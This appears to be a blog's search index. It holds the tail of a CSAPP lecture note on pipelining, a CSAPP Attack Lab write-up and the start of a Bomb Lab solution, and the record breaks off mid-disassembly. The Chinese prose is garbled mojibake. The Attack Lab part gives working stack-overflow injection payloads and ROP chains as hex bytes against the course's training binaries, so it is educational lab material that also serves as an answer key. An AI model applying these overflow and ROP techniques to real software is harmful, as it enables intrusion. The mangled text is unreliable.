é˜¶æ®µçš„æŒ‡ä»¤è®¡ç®—å‡ºæ¥çš„ï¼Œä¼šå‡ºç°é”™è¯¯ï¼Œæ‰€ä»¥éœ€è¦å°†dstEå’ŒdstMä¸€ç›´ä¿å­˜åˆ°åç»­çš„æµæ°´çº¿å¯„å­˜å™¨ä¸­ã€‚**é€šç”¨è§„åˆ™ï¼š**æˆ‘ä»¬è¦ä¿å­˜å¤„äºä¸€ä¸ªæµæ°´çº¿é˜¶æ®µä¸­çš„æŒ‡ä»¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚ æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåªæœ‰callæŒ‡ä»¤éœ€è¦å°†valPä¿å­˜åˆ°å†…å­˜ä¸­ï¼Œå³æˆ‘ä»¬ä¸ºäº†callæŒ‡ä»¤éœ€è¦å°†å–æŒ‡é˜¶æ®µå¾—åˆ°çš„valPä¸€ç›´ä¿å­˜åˆ°åç»­çš„æµæ°´çº¿å¯„å­˜å™¨ä¸­ï¼Œç›´åˆ°è®¿å­˜é˜¶æ®µå°†å…¶ä¿å­˜åˆ°å†…å­˜ä¸­ã€‚ä½†æ˜¯æˆ‘ä»¬å‘ç°callæŒ‡ä»¤åªä½¿ç”¨valBä¿å­˜%rspçš„å€¼ï¼Œå¹¶ä¸ä¼šä½¿ç”¨valAï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡PIPE-ä¸­çš„selectAæ¨¡å—å°†valPä¿å­˜åˆ°valAï¼Œç”±æ­¤å°±ä¸éœ€è¦ä¿å­˜valPäº†ã€‚åŒç†æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼Œå½“ä¸é€‰æ‹©è·³è½¬åˆ†æ”¯æ—¶ï¼Œåé¢ä¹Ÿéœ€è¦valPï¼Œä¹Ÿå¯ä»¥å°†å…¶ä¿å­˜åˆ°valAä¸­ï¼Œç”±æ­¤ä¹Ÿä¸éœ€è¦ä¿å­˜valPäº†ã€‚**é€šç”¨è§„åˆ™ï¼š**é€šè¿‡åˆå¹¶ä¿¡å·æ¥å‡å°‘å¯„å­˜å™¨çŠ¶æ€å’Œçº¿è·¯çš„æ•°é‡ã€‚ **æ³¨æ„ï¼š**å¤§å†™å­—æ¯Fã€Dç­‰ä»£è¡¨æµæ°´çº¿å¯„å­˜å™¨ï¼Œæ‰€ä»¥D_statä»£è¡¨æ˜¯å¯„å­˜å™¨çš„çŠ¶æ€å­—æ®µï¼Œè€Œå°å†™å‰ç¼€ä»£è¡¨çš„æ˜¯æµæ°´çº¿é˜¶æ®µï¼Œæ‰€ä»¥m_statä»£è¡¨è®¿å­˜é˜¶æ®µä¸­ç”±æ§åˆ¶é€»è¾‘å—äº§ç”Ÿçš„çŠ¶æ€ä¿¡å·ã€‚ é¢„æµ‹ä¸‹ä¸€ä¸ªPC å¯¹äºcallå’ŒjmpæŒ‡ä»¤ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å°±æ˜¯valCï¼Œè€Œé™¤äº†æ¡ä»¶åˆ†æ”¯å’ŒretæŒ‡ä»¤å¤–ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å°±æ˜¯valPï¼Œè¿™äº›æŒ‡ä»¤ä¸å­˜åœ¨æ§åˆ¶ç›¸å…³ï¼Œä½¿å¾—æµæ°´çº¿å¤„ç†å™¨èƒ½å¤Ÿæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸå°±å¤„ç†ä¸€æ¡æŒ‡ä»¤ã€‚å¦‚æœå‡ºç°äº†æ¡ä»¶åˆ†æ”¯ï¼Œåˆ™éœ€è¦è¯¥æŒ‡ä»¤è¿è¡Œåˆ°æ‰§è¡Œé˜¶æ®µåæ‰çŸ¥é“æ˜¯å¦é€‰æ‹©è¯¥åˆ†æ”¯ï¼Œå¦‚æœå‡ºç°äº†retæŒ‡ä»¤ï¼Œåˆ™éœ€è¦è¯¥æŒ‡ä»¤è¿è¡Œåˆ°è®¿å­˜é˜¶æ®µï¼Œæ‰çŸ¥é“è¿”å›åœ°å€ã€‚æˆ‘ä»¬é€‰æ‹©é¢„æµ‹PCå€¼æ€»æ˜¯ä¸ºvalCã€‚ æµæ°´çº¿å†’é™© æµæ°´çº¿å†’é™©ä¸»è¦åŒ…å«æ•°æ®å†’é™©å’Œæ§åˆ¶å†’é™©ï¼Œå½“ç¨‹åºçŠ¶æ€çš„è¯»å†™ä¸å¤„äºåŒä¸€é˜¶æ®µï¼Œå°±å¯èƒ½å‡ºç°æ•°æ®å†’é™©ï¼Œå½“å‡ºç°åˆ†æ”¯é¢„æµ‹é”™è¯¯æˆ–retæŒ‡ä»¤æ—¶ï¼Œä¼šå‡ºç°æ§åˆ¶å†’é™©ã€‚ è§£å†³æ–¹æ³•ï¼š ç”¨æš‚åœæ¥é¿å…æ•°æ®å†’é™©ï¼šæˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œé˜¶æ®µä¸­æ’å…¥ä¸€æ®µè‡ªåŠ¨äº§ç”Ÿçš„nopæŒ‡ä»¤ï¼Œæ¥ä¿æŒå¯„å­˜å™¨ã€å†…å­˜ã€æ¡ä»¶ç å’Œç¨‹åºçŠ¶æ€ä¸å˜ï¼Œä½¿å¾—å½“å‰æŒ‡ä»¤åœåœ¨è¯‘ç é˜¶æ®µï¼Œå¹¶ä¸”ä¼šæ§åˆ¶ç¨‹åºè®¡æ•°å™¨ä¸å˜ï¼Œä½¿å¾—ä¸‹ä¸€æ¡æŒ‡ä»¤åœåœ¨å–æŒ‡é˜¶æ®µï¼Œç›´åˆ°äº§ç”ŸæŒ‡ä»¤çš„æºæ“ä½œæ•°çš„æŒ‡ä»¤é€šè¿‡äº†å†™å›é˜¶æ®µã€‚è¯¥æ–¹æ³•æŒ‡ä»¤è¦åœé¡¿æœ€å°‘ä¸€ä¸ªæœ€å¤šä¸‰ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œä¸¥é‡é™ä½æ•´ä½“çš„ååé‡ã€‚ ç”¨è½¬å‘æ¥é¿å…æ•°æ®å†’é™©ï¼šé€šè¿‡ALUçš„è®¡ç®—ç»“æœæ¥è½¬å‘ï¼Œè™½ç„¶å€¼æ²¡æœ‰å†™å…¥å¯„å­˜å™¨ï¼Œä½†æ˜¯å…¶ç¡®å®è¢«è®¡ç®—å‡ºæ¥äº†M_valEå’Œe_valEï¼Œæ‰€ä»¥å¯ä»¥æ”¹å˜è¯‘ç æ–¹å¼æ¥é¿å…æš‚åœå’Œå†’é™©ã€‚ é™¤äº†é€šè¿‡ALUçš„è®¡ç®—ç»“æœæ¥è½¬å‘ï¼Œè¿˜èƒ½é€šè¿‡å†…å­˜æ¥è¿›è¡Œè½¬å‘ï¼Œå¹¶ä¸”é€šè¿‡å½“å‰é˜¶æ®µçš„dstEå’ŒdstMä¸ç›®æ ‡æŒ‡ä»¤çš„srcAå’ŒsrcBè¿›è¡Œåˆ¤æ–­æ¥å†³å®šæ˜¯å¦è½¬å‘ã€‚åœ¨å¤„ç†å™¨ä¸­ï¼ŒvalAå’ŒvalBä¸€å…±æœ‰5ä¸ªè½¬å‘æºï¼š e_valEï¼šåœ¨æ‰§è¡Œé˜¶æ®µï¼ŒALUä¸­è®¡ç®—å¾—åˆ°çš„ç»“æœvalEï¼Œé€šè¿‡E_dstEä¸d_srcAå’Œd_src_Bè¿›è¡Œæ¯”è¾ƒå†³å®šæ˜¯å¦è½¬å‘ã€‚ M_valEï¼šå°†ALUè®¡ç®—çš„ç»“æœvalEä¿å­˜åˆ°æµæ°´çº¿å¯„å­˜å™¨Mä¸­ï¼Œé€šè¿‡M_dstEä¸d_srcAå’Œd_src_Bè¿›è¡Œæ¯”è¾ƒå†³å®šæ˜¯å¦è½¬å‘ã€‚ m_valMï¼šåœ¨è®¿å­˜é˜¶æ®µï¼Œä»å†…å­˜ä¸­è¯»å–çš„å€¼valMï¼Œé€šè¿‡M_dstMä¸d_srcAå’Œd_src_Bè¿›è¡Œæ¯”è¾ƒå†³å®šæ˜¯å¦è½¬å‘ã€‚ W_valMï¼šå°†å†…å­˜ä¸­çš„å€¼valMä¿å­˜åˆ°æµæ°´çº¿å¯„å­˜å™¨Wä¸­ï¼Œé€šè¿‡W_dstMä¸d_srcAå’Œd_src_Bè¿›è¡Œæ¯”è¾ƒå†³å®šæ˜¯å¦è½¬å‘ã€‚ W_valE ï¼šå°†ALUè®¡ç®—çš„ç»“æœvalEä¿å­˜åˆ°æµæ°´çº¿å¯„å­˜å™¨Wä¸­ï¼Œé€šè¿‡W_dstEä¸d_srcAå’Œd_src_Bè¿›è¡Œæ¯”è¾ƒå†³å®šæ˜¯å¦è½¬å‘ã€‚ åŠ è½½/ä½¿ç”¨æ•°æ®å†’é™©ï¼šæœ‰äº›å†’é™©æ— æ³•é€šè¿‡è½¬å‘æ¥æ¸…é™¤ã€‚æˆ‘ä»¬å¯ä»¥å¯¹äº§ç”Ÿå†’é™©çš„æŒ‡ä»¤æš‚åœä¸€ä¸ªå‘¨æœŸã€‚ç§°ä¸ºâ€œåŠ è½½äº’é”ï¼ˆLoad Interlockï¼‰â€ é¿å…æ§åˆ¶å†’é™©ï¼šæ§åˆ¶å†’é™©åªä¼šå‡ºç°åœ¨retæŒ‡ä»¤å’Œè·³è½¬æŒ‡ä»¤é¢„æµ‹é”™æ–¹å‘æ—¶äº§ç”Ÿã€‚è§£å†³æ–¹æ³•æ˜¯æ’å…¥bubbleï¼ˆï¼Ÿï¼‰ å¼‚å¸¸å¤„ç† å¼‚å¸¸å¯ä»¥ç”±ç¨‹åºæ‰§è¡Œä»å†…éƒ¨äº§ç”Ÿï¼Œä¹Ÿå¯ä»¥ç”±æŸä¸ªå¤–éƒ¨ä¿¡å·ä»å¤–éƒ¨äº§ç”Ÿã€‚å½“å‰çš„ISAåŒ…å«ä¸‰ç§å†…éƒ¨äº§ç”Ÿçš„å¼‚å¸¸ï¼š1. haltæŒ‡ä»¤ï¼›2. éæ³•æŒ‡ä»¤ç å’ŒåŠŸèƒ½ç ç»„åˆçš„æŒ‡ä»¤ï¼›3. å–å€¼æˆ–æ•°æ®è¯»å†™è®¿é—®éæ³•åœ°å€ã€‚å¤–éƒ¨äº§ç”Ÿçš„å¼‚å¸¸åŒ…æ‹¬ï¼šæ¥æ”¶åˆ°ä¸€ä¸ªç½‘ç»œæ¥å£å—åˆ°æ–°åŒ…çš„ä¿¡å·ã€ç‚¹å‡»é¼ æ ‡çš„ä¿¡å·ç­‰ç­‰ã€‚ å½“åŒæ—¶å¤šæ¡æŒ‡ä»¤å¼•èµ·å¼‚å¸¸æ—¶ï¼Œå¤„ç†å™¨åº”è¯¥å‘æ“ä½œç³»ç»ŸæŠ¥å‘Šå“ªä¸ªå¼‚å¸¸ï¼Ÿ**åŸºæœ¬åŸåˆ™ï¼š**ç”±æµæ°´çº¿ä¸­æœ€æ·±çš„æŒ‡ä»¤å¼•èµ·çš„å¼‚å¸¸ï¼Œä¼˜å…ˆçº§æœ€é«˜ï¼Œå› ä¸ºæŒ‡ä»¤åœ¨æµæ°´çº¿ä¸­è¶Šæ·±çš„é˜¶æ®µï¼Œè¡¨ç¤ºè¯¥æŒ‡ä»¤è¶Šæ—©æ‰§è¡Œã€‚ åœ¨åˆ†æ”¯é¢„æµ‹ä¸­ï¼Œå½“é¢„æµ‹åˆ†æ”¯ä¸­å‡ºç°äº†å¼‚å¸¸ï¼Œè€Œåç”±äºé¢„æµ‹é”™è¯¯è€Œå–æ¶ˆè¯¥æŒ‡ä»¤æ—¶ï¼Œéœ€è¦å–æ¶ˆå¼‚å¸¸ã€‚ æš‚åœå’Œæ°”æ³¡æ˜¯æµæ°´çº¿ä¸­ä½çº§çš„æœºåˆ¶ï¼Œæš‚åœèƒ½å°†æŒ‡ä»¤é˜»å¡åœ¨æŸä¸ªé˜¶æ®µï¼Œå¾€æµæ°´çº¿ä¸­æ’å…¥bubbleèƒ½ä½¿å¾—æµæ°´çº¿ç»§ç»­è¿è¡Œï¼Œä½†æ˜¯ä¸ä¼šæ”¹å˜å½“å‰é˜¶æ®µçš„å¯„å­˜å™¨ã€å†…å­˜ã€æ¡ä»¶ç æˆ–ç¨‹åºçŠ¶æ€ã€‚è¿™ä¸¤ä¸ªçŠ¶æ€å†³å®šäº†å½“æ—¶é’Ÿç”µå¹³å˜é«˜æ—¶ï¼Œå¦‚ä½•ä¿®æ”¹æµæ°´çº¿å¯„å­˜å™¨ã€‚ ","date":"2021-02-04","objectID":"/csapp-lecture-04/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#æµæ°´çº¿"},{"categories":["Pwning"],"content":"CSAPP-Attacklabç¨‹åºåœ¨ä¸€ç³»åˆ—çš„åˆå§‹åŒ–ä¹‹åï¼Œä¼šè¿›å…¥test ","date":"2021-02-02","objectID":"/csapp-attacklab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#csapp-attacklab"},{"categories":["Pwning"],"content":"phase_1 0000000000401968 \u003ctest\u003e: 401968: 48 83 ec 08 sub $0x8,%rsp 40196c: b8 00 00 00 00 mov $0x0,%eax 401971: e8 32 fe ff ff callq 4017a8 \u003cgetbuf\u003e 401976: 89 c2 mov %eax,%edx 401978: be 88 31 40 00 mov $0x403188,%esi 40197d: bf 01 00 00 00 mov $0x1,%edi 401982: b8 00 00 00 00 mov $0x0,%eax 401987: e8 64 f4 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 40198c: 48 83 c4 08 add $0x8,%rsp 00000000004017a8 \u003cgetbuf\u003e: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 \u003cGets\u003e 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 00000000004017c0 \u003ctouch1\u003e: 4017c0: 48 83 ec 08 sub $0x8,%rsp 4017c4: c7 05 0e 2d 20 00 01 movl $0x1,0x202d0e(%rip) # 6044dc \u003cvlevel\u003e 4017cb: 00 00 00 4017ce: bf c5 30 40 00 mov $0x4030c5,%edi 4017d3: e8 e8 f4 ff ff callq 400cc0 \u003cputs@plt\u003e 4017d8: bf 01 00 00 00 mov $0x1,%edi 4017dd: e8 ab 04 00 00 callq 401c8d \u003cvalidate\u003e 4017e2: bf 00 00 00 00 mov $0x0,%edi 4017e7: e8 54 f6 ff ff callq 400e40 \u003cexit@plt\u003e è¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºè¿›å…¥touch1ã€‚getbufçš„æ ˆé•¿åº¦ä¸º0x28ï¼ŒGetsçš„ç¬¬ä¸€ä¸ªå‚æ•°æ­£å¥½åœ¨æ ˆä¸Šã€‚æ‰€ä»¥ï¼Œå…ˆè¾“å…¥0x28å­—èŠ‚çš„paddingï¼Œç„¶åè¦†ç›–è¿”å›åœ°å€ä¸ºtouch1çš„åœ°å€ã€‚ ç­”æ¡ˆ(å¿…é¡»æ˜¯hex)ï¼š 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 ","date":"2021-02-02","objectID":"/csapp-attacklab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#phase_1"},{"categories":["Pwning"],"content":"phase_2 00000000004017ec \u003ctouch2\u003e: 4017ec: 48 83 ec 08 sub $0x8,%rsp 4017f0: 89 fa mov %edi,%edx 4017f2: c7 05 e0 2c 20 00 02 movl $0x2,0x202ce0(%rip) # 6044dc \u003cvlevel\u003e 4017f9: 00 00 00 4017fc: 3b 3d e2 2c 20 00 cmp 0x202ce2(%rip),%edi # 6044e4 \u003ccookie\u003e 401802: 75 20 jne 401824 \u003ctouch2+0x38\u003e 401804: be e8 30 40 00 mov $0x4030e8,%esi 401809: bf 01 00 00 00 mov $0x1,%edi 40180e: b8 00 00 00 00 mov $0x0,%eax 401813: e8 d8 f5 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 401818: bf 02 00 00 00 mov $0x2,%edi 40181d: e8 6b 04 00 00 callq 401c8d \u003cvalidate\u003e 401822: eb 1e jmp 401842 \u003ctouch2+0x56\u003e 401824: be 10 31 40 00 mov $0x403110,%esi 401829: bf 01 00 00 00 mov $0x1,%edi 40182e: b8 00 00 00 00 mov $0x0,%eax 401833: e8 b8 f5 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 401838: bf 02 00 00 00 mov $0x2,%edi 40183d: e8 0d 05 00 00 callq 401d4f \u003cfail\u003e 401842: bf 00 00 00 00 mov $0x0,%edi 401847: e8 f4 f5 ff ff callq 400e40 \u003cexit@plt\u003e æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯é‡æ–°è°ƒç”¨touch2ï¼Œè¾“å…¥å‡½æ•°ä¾ç„¶æ˜¯getbufã€‚touch2å‡½æ•°ä¸­æœ‰ä¸€ä¸ªå‚æ•°ä¸”è¿™ä¸ªå‚æ•°å¿…é¡»ç­‰äºcookieå€¼ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è°ƒç”¨touch2ä¹‹å‰è¦å…ˆå°†cookieæ”¾å…¥rdiã€‚å°†æˆ‘ä»¬æ³¨å…¥çš„ä»£ç å†™åˆ°æ ˆä¸Šï¼Œç„¶åè°ƒç”¨è®¾ç½®rdiï¼Œæœ€åè¿”å›touch2ã€‚ æ‰€ä»¥æ³¨å…¥ä»£ç ä¸ºï¼šmov 0x59b997fa,rdi;ret; ï¼Œæ ˆå¸ƒå±€ï¼š |mov 0x59b997fa,rdi | |ret touch2 | |padding | |shellcode_addr | æŸ¥çœ‹getbufå¤„çš„rspï¼š pwndbg\u003e info r rsp rsp 0x5561dc78 0x5561dc78 è¿™é‡Œçš„rspå…¶å®æ˜¯Getsæ ˆåº•ï¼Œæ‰€ä»¥ç­”æ¡ˆä¸ºï¼š 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 ","date":"2021-02-02","objectID":"/csapp-attacklab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#phase_2"},{"categories":["Pwning"],"content":"phase_3 void touch3(char *sval){ vlevel=3; if(hexmatch(cookie,sval)){ printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\",sval); validate(3); }else{ printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\",sval); fail(3); } exit(0); } int hexmatch(unsigned val,char *sval){ char cbuf[110]; char *s = cbuf+random()%100; sprintf(s,\"%.8x\",val); return strncmp(sval,s,9) == 0; } è¿™é‡Œæˆ‘ä»¬éœ€è¦è°ƒç”¨touch3ï¼Œéœ€è¦å°†å­˜æ”¾cookieå­—ç¬¦ä¸²çš„åœ°å€ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†å­—ç¬¦ä¸²å†™åœ¨æ ˆä¸Šï¼Œç„¶åå°†åœ°å€æ”¾å…¥rdiï¼Œç„¶åè°ƒç”¨touch3ã€‚cookieè½¬ä¸ºASCIIå­—ç¬¦ï¼š pwndbg\u003e print /x \"59b997fa\" $1 = {0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61, 0x0} æ ˆçš„ç»“æ„ï¼š |mov cookie_addr,rdi| |ret touch3 | |padding | |shellcode_addr | |cookie | ç­”æ¡ˆï¼š 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\"59b997fa\") Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2021-02-02","objectID":"/csapp-attacklab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#phase_3"},{"categories":["Pwning"],"content":"ROP-Level2ä½¿ç”¨gadgetå®Œæˆlevel2ã€‚gadgeté™å®šäº†èŒƒå›´ï¼š0x401994-0x401ab2 00000000004019c3 \u003csetval_426\u003e: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 00000000004019a7 \u003caddval_219\u003e: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 è¿™é‡Œ89 c7 90 c3==\u003emov rdi,rax;nop;retï¼Œä¸‹é¢çš„58 90 c3==\u003epop rax;nop;ret è¿™ä¸¤ä¸ªgadgetå¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶rdiçš„å€¼ã€‚ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 /*pop rax ; nop ; ret*/ fa 97 b9 59 00 00 00 00 /*cookie*/ c5 19 40 00 00 00 00 00 /*mov rdi, rax ; nop ;ret*/ ec 17 40 00 00 00 00 00 /*touch2*/ niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 ","date":"2021-02-02","objectID":"/csapp-attacklab/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#rop-level2"},{"categories":["Pwning"],"content":"ROP-Level3ä½¿ç”¨gadgetå®Œæˆlevel3ã€‚ æˆ‘ä»¬è¦æƒ³åŠæ³•å°†å­—ç¬¦ä¸²åœ°å€ä¼ å…¥rdiä¸­ã€‚ä½†æ˜¯åœ¨rtargetä¸­ï¼Œæ ˆåœ°å€éšæœºåŒ–ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•æƒ³ä¹‹å‰é‚£æ ·ç›´æ¥ä¼ å…¥æ ˆåœ°å€ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦å–å¾—rspçš„å€¼ã€‚å¹¶å¯ä»¥å¯¹å®ƒåšè®¡ç®— 0x0000000000401a06 : mov rax, rsp ; ret 0x00000000004019a2 : mov rdi, rax ; ret 0x00000000004019ab : pop rax ; nop ; ret 0x00000000004019d6 : lea rax, [rdi + rsi] ; ret 0x0000000000401a13 : mov esi, ecx ; nop ; nop ; ret 0x0000000000401a69 : mov ecx, edx ; or bl, bl ; ret 0x00000000004019dd : mov edx, eax ; nop ; ret mov rax, rsp ; ret; mov rdi, rax ; retï¼Œå–å¾—rsp,å¹¶å°†å…¶å­˜å…¥rdiã€‚ pop rax ; nop ; retæ§åˆ¶raxçš„å€¼ã€‚ mov edx, eax ; nop ; ret ; mov ecx, edx ; or bl, bl ; ret ; mov esi, ecx ; nop ; nop ; retï¼Œæ§åˆ¶äº†rsiçš„å€¼ã€‚ lea rax, [rdi + rsi] ; ret ; mov rdi, rax ; retï¼Œå°†rdiä¸­çš„å€¼åŠ ä¸Šrsiä¸­çš„åç§»ï¼Œåˆæ”¾å…¥rdiã€‚ |padding | |0x0000000000401a06 | |0x00000000004019a2 | |0x00000000004019ab | |offset | |0x00000000004019dd | |0x0000000000401a69 | |0x0000000000401a13 | |0x00000000004019d6 | |0x00000000004019a2 | |touch3 | |cookie | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(\"59b997fa\") Valid solution for level 3 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2021-02-02","objectID":"/csapp-attacklab/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#rop-level3"},{"categories":["Pwning"],"content":"CSAPP-Bmoblabè¾“å…¥æ­£ç¡®çš„å­—ç¬¦ä¸²æ‹†é™¤å…­ä¸ªç‚¸å¼¹ï¼Œé€šè¿‡åˆ†ææ±‡ç¼–ä»£ç +è°ƒè¯•æ‰¾å‡ºç­”æ¡ˆã€‚æ„å¤–åœ°å¾ˆå¥½ç©~~ ","date":"2021-01-31","objectID":"/csapp-bomblab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#csapp-bmoblab"},{"categories":["Pwning"],"content":"phase_1 0000000000400ee0 \u003cphase_1\u003e: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 \u003cstrings_not_equal\u003e 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 \u003cphase_1+0x17\u003e 400ef2: e8 43 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq read_lineçš„è¾“å…¥è¢«å½“ä½œç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥äº†phase_1ï¼Œéšå0x4020400ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿›å…¥äº†strings_not_equalï¼Œtest eax,eaxæ¯”è¾ƒè¿”å›å€¼ï¼Œä¸ç›¸ç­‰å°±ä¼šexplode_bombã€‚æ‰€ä»¥æˆ‘ä»¬è¦è¾“å…¥çš„å­—ç¬¦ä¸²å°±åœ¨0x402400å¤„ã€‚ pwndbg\u003e print (char *) 0x402400 $1 = 0x402400 \"Border relations with Canada have never been better.\" ","date":"2021-01-31","objectID":"/csapp-bomblab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_1"},{"categories":["Pwning"],"content":"phase_2åŒæ ·è¾“å…¥è¢«å½“ä½œç¬¬ä¸€ä¸ªå‚æ•°ã€‚ 0000000000400efc \u003cphase_2\u003e: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c \u003cread_six_numbers\u003e 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 \u003cphase_2+0x34\u003e 400f10: e8 25 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400f15: eb 19 jmp 400f30 \u003cphase_2+0x34\u003e 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 \u003cphase_2+0x29\u003e 400f20: e8 15 05 00 00 callq 40143a 